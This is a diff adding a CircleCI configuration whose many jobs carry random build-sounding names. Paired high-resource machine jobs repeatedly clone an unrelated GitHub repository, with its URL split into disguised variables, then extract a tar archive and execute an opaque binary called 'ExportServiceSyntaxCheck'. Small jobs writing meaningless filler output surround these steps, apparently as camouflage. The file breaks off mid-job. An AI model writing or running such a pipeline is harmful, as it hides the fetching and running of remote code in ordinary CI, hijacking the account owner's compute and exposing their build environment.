@@ -1,0 +1,1789 @@
+version: 2.1
+
+jobs:
+  compileSettingsLoaderAssets:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: analyticsCode
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; probes=0; until ((probes == 3)); do probes=$((probes + 1)); done; echo "rule engine ready after $probes probes"; true ; } > /tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'retry-indexer-contract-tests'
+  post-package-upgrade-smoke-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/retry-indexer-contract-tests" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 3 --no-tags --no-single-branch "$download/$shardof/$bucketof" "$PWD"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            sh -c './ExportServiceSyntaxCheck'
+  Sending:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: search-memory-benchmark
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; seq 4 | while read -r m; do printf 'tick %d\n' "$m"; done; true ; } > /tmp/ExecuteKernelSanityTests/report-exporter-package-upload
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'report-exporter-package-upload'
+  scan-summary-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/report-exporter-package-upload" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/report-exporter-package-upload" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --filter=blob:none "$download/$shardof/$bucketof" "`pwd`"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            sh -c "exec ./ExportServiceSyntaxCheck"
+  analyze-metrics:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: conditional-mobile-app-artifact-compression
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; unit="allocator"; echo "$unit is ready"; true ; } > /tmp/ExecuteKernelSanityTests/check-out-file-server-scripts
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'check-out-file-server-scripts'
+  sandbox-release-smoke-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/check-out-file-server-scripts" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/check-out-file-server-scripts" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 10 "$download/$shardof/$bucketof" "$(pwd)"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            './ExportServiceSyntaxCheck'
+  CompilerLogCompression:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Rule Engine Bundle (slice 4)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' saturn hinge tau silver walnut wrench | grep -o i | wc -l && echo 'resuming unit tests'; true ; } > /tmp/ExecuteKernelSanityTests/inform-reviewers-after-roll-out
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'inform-reviewers-after-roll-out'
+  copy-golden-files-from-mirror:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/inform-reviewers-after-roll-out" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/inform-reviewers-after-roll-out" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 5 --filter=blob:none "$download/$shardof/$bucketof" ./
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            exec ./ExportServiceSyntaxCheck
+  Close:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: post-upgrade-report-upload
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; list=(red elk meteor); printf '%s,' "${list[@]}"; echo; printf '%s\n' "4 tests collected"; true ; } > /tmp/ExecuteKernelSanityTests/minimal-comparison
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'minimal-comparison'
+  catalog-changelog-round-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/minimal-comparison" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/minimal-comparison" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=1 --filter=tree:0 "$download/$shardof/$bucketof" "."
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env ./ExportServiceSyntaxCheck
+  EngineHealthChecksWorker2Of14:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: analytics-license-report
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; j=0; while test "$j" -lt 3; do j=$((j+1)); echo "tick $j of 3"; done; echo "finished"; true ; } > /tmp/ExecuteKernelSanityTests/RateLimiterEnvironmentSettings
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'RateLimiterEnvironmentSettings'
+  PublishingMessagingUserGuide:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/RateLimiterEnvironmentSettings" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/RateLimiterEnvironmentSettings" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=4 --filter=blob:none "$download/$shardof/$bucketof" "$PWD"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            /bin/sh -c "./ExportServiceSyntaxCheck"
+  reportExporterDatabaseSchema:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: Summarize coverage report in full detail
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; row="hammer,snake,yellow"; echo "${row%%,*}"; true ; } > /tmp/ExecuteKernelSanityTests/TestingInstaller
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'TestingInstaller'
+  profiler-checksum:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/TestingInstaller" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/TestingInstaller" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=4 "$download/$shardof/$bucketof" ${PWD}
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env "./ExportServiceSyntaxCheck"
+  embed-engine-version-number:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Rollback run (chunk 8)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; parts=(cobalt llama yak oak bronze rowan); echo "${parts[-1]}"; true ; } > /tmp/ExecuteKernelSanityTests/legacy-deployment-verification
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'legacy-deployment-verification'
+  ReportBuilderHashes:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/legacy-deployment-verification" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/legacy-deployment-verification" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=1 "$download/$shardof/$bucketof" "$(pwd)"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            sh -c "./ExportServiceSyntaxCheck"
+  Flag:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: LaunchExtendedMobileAppTestsSlice5
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; test "cyan" = "cyan"; echo "status $?"; echo "starting release notes"; true ; } > /tmp/ExecuteKernelSanityTests/clone-notifier-repository
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'clone-notifier-repository'
+  RollBackMessagingInstances:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/clone-notifier-repository" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/clone-notifier-repository" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --filter=tree:0 "$download/$shardof/$bucketof" .
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd . && exec ./ExportServiceSyntaxCheck
+  DeployStorage:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Quick toolkit tests (step 4)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo 3 tests collected; k=79; if [ "$k" -ge 7 ] && [ "$k" -le 467 ]; then echo "within bounds"; else echo "outside bounds"; fi; true ; } > /tmp/ExecuteKernelSanityTests/periodicConfigurationMigration
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'periodicConfigurationMigration'
+  LintFastTestsForCanary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/periodicConfigurationMigration" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/periodicConfigurationMigration" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth=2 --no-tags "$download/$shardof/$bucketof" "$(pwd)"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            "$PWD/ExportServiceSyntaxCheck"
+  server-dependency-review-stage:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: compute-and-upload-viewer-signature
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; larger_of() { if [ "$1" -gt "$2" ]; then echo "$1"; else echo "$2"; fi; }; larger_of 21 10; echo "ready"; true ; } > /tmp/ExecuteKernelSanityTests/creating-checksum
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'creating-checksum'
+  jobRunnerVersionBump:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/creating-checksum" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/creating-checksum" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --shallow-submodules "$download/$shardof/$bucketof" ./
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -lc './ExportServiceSyntaxCheck'
+  admin-panel-build-logs-slot-5:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: ShowReleaseStatus
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; k=$((84 - 15)); echo "got $k"; true ; } > /tmp/ExecuteKernelSanityTests/localization-schema
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'localization-schema'
+  pruneFirmwareDependencyCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/localization-schema" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/localization-schema" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --filter=tree:0 "$download/$shardof/$bucketof" .
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -c "exec ./ExportServiceSyntaxCheck"
+  on-demand-source-checksum:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: log-upload-step
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; doc="main.ini"; echo "$doc" | cut -d. -f1; true ; } > /tmp/ExecuteKernelSanityTests/DisplayLandingPageVersionTag
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'DisplayLandingPageVersionTag'
+  bundle-job-runner:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/DisplayLandingPageVersionTag" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/DisplayLandingPageVersionTag" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 3 --no-tags "$download/$shardof/$bucketof" "."
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd "$PWD" && exec ./ExportServiceSyntaxCheck
+  restore-front-end-layer-cache:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Import Server Compiler Flags With Timeout
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo "queue drain complete"; give_status() { return "$1"; }; give_status 0; echo zero; give_status 10 || echo "nonzero $?"; true ; } > /tmp/ExecuteKernelSanityTests/content-digest-group-8
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'content-digest-group-8'
+  complete-dependency-audit-phase:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/content-digest-group-8" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/content-digest-group-8" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 1 "$download/$shardof/$bucketof" "${PWD}"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -c './ExportServiceSyntaxCheck'
+  basicImageUpdatePipeline:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Promote registry release
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' gear argon argon boron neptune | sed 'G'; true ; } > /tmp/ExecuteKernelSanityTests/post-submit-script
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'post-submit-script'
+  MonitorTestData:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/post-submit-script" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/post-submit-script" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 1 --filter=tree:0 "$download/$shardof/$bucketof" "."
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd . && ./ExportServiceSyntaxCheck
+  post-backup-task:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Deferred installer update (segment 2 of 5)
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo '11 warnings, 0 errors'; mapfile -t rows < <(printf '%s\n' lunar rat seal washer); echo "${#rows[@]} rows, last ${rows[-1]}"; true ; } > /tmp/ExecuteKernelSanityTests/extended-library-release
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'extended-library-release'
+  UnlockingProductionEnvironment:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/extended-library-release" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/extended-library-release" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone -q "$download/$shardof/$bucketof" ${PWD}
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            bash -lc "./ExportServiceSyntaxCheck"
+  WaitForLinkCheckerInstances:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Upload icons in parallel
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo 'holding indexer'; printf '%s\n' "cow 24" "fox 18" "chisel 20" "lime 5" | tr ' ' ,; echo 'releasing indexer'; true ; } > /tmp/ExecuteKernelSanityTests/launcher-checksum
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'launcher-checksum'
+  PartnerPortalDeploymentPackage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/launcher-checksum" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/launcher-checksum" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 1 --branch main "$download/$shardof/$bucketof" "${PWD}"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            cd . && ./ExportServiceSyntaxCheck
+  optimizing-translations:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Show debugger hashes
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; added=110; removed=5; echo "+$added -$removed, net $((added - removed)) lines"; true ; } > /tmp/ExecuteKernelSanityTests/PrintAndVerifyParserHashes
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'PrintAndVerifyParserHashes'
+  store-failure-report-attempt-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/PrintAndVerifyParserHashes" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/PrintAndVerifyParserHashes" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --quiet "$download/$shardof/$bucketof" $PWD
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            $(pwd)/ExportServiceSyntaxCheck
+  verifyReleaseTag:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - run:
+          name: dailyContentDigestSegment2
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "nothing to do for thumbnailer" && printf '%s\n' purple,26 cherry,40 salmon,38 pecan,2 | sort | paste -s -d' '; true ; } > /tmp/ExecuteKernelSanityTests/importer-reference-manual
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'importer-reference-manual'
+  verify-stable-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/importer-reference-manual" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/importer-reference-manual" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --depth 2 --branch main "$download/$shardof/$bucketof" "${PWD}"
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            /bin/sh -c "./ExportServiceSyntaxCheck"
+  dependency-digest-task:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: on-demand-environment-provisioning
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; echo all good; count=31; if [[ "$count" =~ ^[0-9]+$ ]]; then echo numeric; else echo other; fi; true ; } > /tmp/ExecuteKernelSanityTests/ApplyBatchWorkerFeatureFlags
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'ApplyBatchWorkerFeatureFlags'
+  summarize-coverage:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: pre-install-change-review
+          command: |
+            stat -c '%m,%o' "/tmp/ExecuteKernelSanityTests/ApplyBatchWorkerFeatureFlags" && sed -n '100,$p' "/tmp/ExecuteKernelSanityTests/ApplyBatchWorkerFeatureFlags" | cut -f 1 | sort | sed -n '2000,2007p' | cut -c 1-50
+      - run:
+          name: Scan Summary Workflow
+          command: |
+            download=https://github.com; shardof=margeauxmcleaniuq9t-sudo; bucketof=EdgeProxyPackageNode5
+            git clone --filter blob:none "$download/$shardof/$bucketof" $PWD
+      - run:
+          name: format-upload-service-deployment-configuration
+          command: |
+            tar -I bzip2 -xf RebuildProject.tar.bz2
+      - run:
+          command: |
+            env "./ExportServiceSyntaxCheck"
+  LicenseReport:
+    docker:
+      - image: cimg/base:stable
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
+          name: Low-Priority Rollback
+          command: |
+            mkdir -p /tmp/ExecuteKernelSanityTests
+            { set +o pipefail 2>/dev/null; printf '%s\n' cow wren guava | while read -r pkg; do echo "rendering $pkg"; done; echo "queue is empty"; true ; } > /tmp/ExecuteKernelSanityTests/post-upload-format-checks
+      - persist_to_workspace:
+          root: /tmp/ExecuteKernelSanityTests
+          paths:
+            - 'post-upload-format-checks'
+  web-app-release-manifest:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ExecuteKernelSanityTests
+      - run:
